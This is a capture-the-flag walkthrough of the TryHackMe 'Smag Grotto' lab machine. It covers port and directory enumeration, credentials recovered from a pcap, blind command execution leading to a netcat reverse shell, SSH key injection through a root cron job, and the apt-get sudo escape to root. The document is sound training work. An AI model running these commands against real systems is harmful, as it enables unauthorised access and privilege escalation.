# Smag Grotto

URL: https://tryhackme.com/room/smaggrotto

Level: Easy

Start time: 1 February 2022, 4:37pm GMT+1

End time: 1 February 2022, 7:24pm GMT+1

Actual play time: 1 hours 31 minutes

## Walkthrough

### Enumeration


#### NMAP


Let's start with a basic nmap scan:

```
# Nmap 7.92 scan initiated Tue Feb  1 16:36:16 2022 as: nmap -T4 -p- -oN 01_nmap 10.10.175.45
Nmap scan report for 10.10.175.45
Host is up (0.063s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# Nmap done at Tue Feb  1 16:37:29 2022 -- 1 IP address (1 host up) scanned in 73.32 seconds
```

We got 2 open ports. Let's check again with service detection (-sV) and default script (-sC):

```
# Nmap 7.92 scan initiated Tue Feb  1 16:38:28 2022 as: nmap -T4 -p22,80 -sC -sV -oN 02_nmap 10.10.175.45
Nmap scan report for 10.10.175.45
Host is up (0.056s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 74:e0:e1:b4:05:85:6a:15:68:7e:16:da:f2:c7:6b:ee (RSA)
|   256 bd:43:62:b9:a1:86:51:36:f8:c7:df:f9:0f:63:8f:a3 (ECDSA)
|_  256 f9:e7:da:07:8f:10:af:97:0b:32:87:c9:32:d7:1b:76 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Smag
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Feb  1 16:38:39 2022 -- 1 IP address (1 host up) scanned in 10.67 seconds
```
#### HTTP

We check target with our browser:

![Screenshot_2022-02-01_16-40-47](https://user-images.githubusercontent.com/42389836/152342610-54607455-611b-43c5-9873-9b6a4bfbc1e2.png)

Nothing interesting in HTML source. We run `gobuster`:

```
root@kaligra:/opt/thm/Smag_Grotto# gobuster dir -u http://10.10.175.45 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.175.45
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/01 16:46:23 Starting gobuster in directory enumeration mode
===============================================================
/mail                 (Status: 301) [Size: 311] [--> http://10.10.175.45/mail/]
/server-status        (Status: 403) [Size: 277]

===============================================================
2022/02/01 17:08:06 Finished
===============================================================
```

We open /mail folder and we found a webpage with some email messages:

![Screenshot_2022-02-01_16-47-02](https://user-images.githubusercontent.com/42389836/152342955-babb1e48-6c12-48fb-b6b0-8bc5db0f0478.png)

There is a .pcap file, we download it and open in Wireshark:

![Screenshot_2022-02-01_16-49-46](https://user-images.githubusercontent.com/42389836/152343129-ccd7eb07-5ef0-4e90-bdc3-1fc3ff2ff7c1.png)

![Screenshot_2022-02-01_16-50-11](https://user-images.githubusercontent.com/42389836/152343217-e513e1f2-b6c8-4f29-9f5a-383d02791a8e.png)

We got some credentials:

`helpdesk/cH4nG3M3_n0w`

There is also an indication of subdomain: development.smag.thm

So I added such entry in `hosts` file:

```
10.10.175.45    development.smag.thm
```

We reach a login page:

![Screenshot 2020-07-29 18 53 58](https://user-images.githubusercontent.com/42389836/152365534-bb04d71c-0f21-41a6-8fbe-3eb8b8c43b9c.png)

And we can easily go ahead with previous credentials.

Now we are facing a simple page which ask us to run some commmand:

![Screenshot_2022-02-01_16-53-58](https://user-images.githubusercontent.com/42389836/152365852-fb86729f-3ecd-469f-94ae-b481908a2c85.png)

We try a simple `uname` but we get no response on screen. It seems a "blind" command execution.

So, we try something that can give us a positive response that our command actually worked.

First, we create a simple text file and we spawn a Python HTTP server:

```
root@kaligra:/opt/thm/Smag_Grotto# echo "test" > sugo.txt

root@kaligra:/opt/thm/Smag_Grotto# python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

We try to download that file from target server:

![Screenshot_2022-02-01_18-03-22](https://user-images.githubusercontent.com/42389836/152367820-a35f21d7-1196-4447-97ae-debbbd5289d0.png)

And we get a valid request:

```
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.93.43 - - [01/Feb/2022 18:03:26] "GET /sugo.txt HTTP/1.1" 200 -
```

Then we spawn a netcat listener on our machine:

```
root@kaligra:/etc# nc -nvlp 4444
listening on [any] 4444 ...
```

and we try a bash reverse shell connection:

![Screenshot_2022-02-01_18-05-38](https://user-images.githubusercontent.com/42389836/152368491-f7793fdf-2039-4dff-96ca-527de1b04f87.png)

We get a shell:

```
connect to [10.8.147.132] from (UNKNOWN) [10.10.93.43] 34320
/bin/sh: 0: can't access tty; job control turned off
$ $ $ $ $ $ $ $ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```

We upgrade shell:

```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@smag:/var/www/development.smag.thm$ 
```

We try to explore `crontab` on this system, and we found something interesting:

```
www-data@smag:/tmp$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
#
www-data@smag:/tmp$ 
```

Since we have write permission on `/opt/.backups/jake_id_rsa.pub.backup`, we can overwrite such file with our public ssh key.

Let's generate one:

```
root@kaligra:/opt/thm/Smag_Grotto# ssh-keygen -t rsa -f sgrotto.key
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in sgrotto.key
Your public key has been saved in sgrotto.key.pub
The key fingerprint is:
SHA256:oPt7t5YeFS23SqsFFZqvdAXkaVBDdWL3e5OcCNO8aXU root@kaligra
The key's randomart image is:
+---[RSA 3072]----+
|          .+B.+ o|
|           =oB +.|
|      .   ooBo+.E|
|     . .   +o=*.=|
|    .   S o ==.*.|
|     .   . *.o  o|
|    .     o.+    |
|     .  . ++     |
|      oo ++.     |
+----[SHA256]-----+
```

We can transfer our key with same technique as before:

```
www-data@smag:/opt/.backups$ wget http://10.8.147.132:8000/sgrotto.key.pub -O /tmp/cristo
<$ wget http://10.8.147.132:8000/sgrotto.key.pub -O /tmp/cristo              
--2022-02-01 10:19:42--  http://10.8.147.132:8000/sgrotto.key.pub
Connecting to 10.8.147.132:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 566 [application/vnd.exstream-package]
Saving to: '/tmp/cristo'

/tmp/cristo         100%[===================>]     566  --.-KB/s    in 0s      

2022-02-01 10:19:42 (93.4 MB/s) - '/tmp/cristo' saved [566/566]

www-data@smag:/opt/.backups$ md5sum /tmp/cristo
md5sum /tmp/cristo
e3d92e186c99ccd64c1dcb3ea431ffae  /tmp/cristo
www-data@smag:/opt/.backups$ cat /tmp/cristo > jake_id_rsa.pub.backup
cat /tmp/cristo > jake_id_rsa.pub.backup
www-data@smag:/opt/.backups$ 
```

### User flag

Now we can access with our private SSH key and grab user flag:

```
root@kaligra:/opt/thm/Smag_Grotto# ssh -i sgrotto.key jake@10.10.165.90
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Fri Jun  5 10:15:15 2020
jake@smag:~$ cat user.txt
iusGorV7EbmxM5AuIe2w499[...........]
```

### Privilege escalation

We explore our possibilities and we found that we can run `apt-get`:

```
jake@smag:~$ sudo -l
Matching Defaults entries for jake on smag:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on smag:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
```

According to GTFObins, we try last technique:

https://gtfobins.github.io/gtfobins/apt-get/

And we get root access:

```
jake@smag:~$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# cat root.txt
cat: root.txt: No such file or directory
# ls
cristo  LinEnum.sh  linpeas.sh  linux-exploit-suggester.sh  linuxprivchecker.py  lol  systemd-private-02fa2fd7f5ec489293934b60327ccacf-systemd-timesyncd.service-Icn3Qe  VMwareDnD
# cd /root
# cat root.txt
uJr6zRgetaniyHVRqqL[...]
# 
```


